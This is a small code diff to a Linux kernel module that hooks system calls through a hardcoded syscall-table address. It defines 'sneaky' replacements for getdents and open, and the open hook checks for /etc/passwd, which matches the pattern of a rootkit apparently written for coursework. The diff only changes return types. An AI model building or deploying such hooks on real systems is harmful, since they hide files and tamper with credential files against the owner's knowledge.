@@ -51,7 +51,7 @@ static unsigned long *sys_call_table = (unsigned long *)0xffffffff81a00200;
 //should expect ti find its arguments on the stack (not in registers).
 //This is used for all system calls.
 asmlinkage long (*original_getdents)(unsigned int fd, struct linux_dirent __user *dirp, unsigned int count);
-asmlinkage long (*original_open)(const char *filename, int flags, int mode);
+asmlinkage int (*original_open)(const char *filename, int flags, int mode);
 //asmlinkage long (*original_read)(int fd, void *buf, size_t count);
 
 //Define our new sneaky version of the 'getdents' syscall
@@ -86,7 +86,7 @@ asmlinkage long sneaky_sys_getdents(unsigned int fd, struct linux_dirent __user 
   return value;
 }
 
-asmlinkage long sneaky_sys_open(const char *filename, int flags, int mode) {
+asmlinkage int sneaky_sys_open(const char *filename, int flags, int mode) {
   
   if (strcmp(filename, etc_passwd) == 0 )
   {
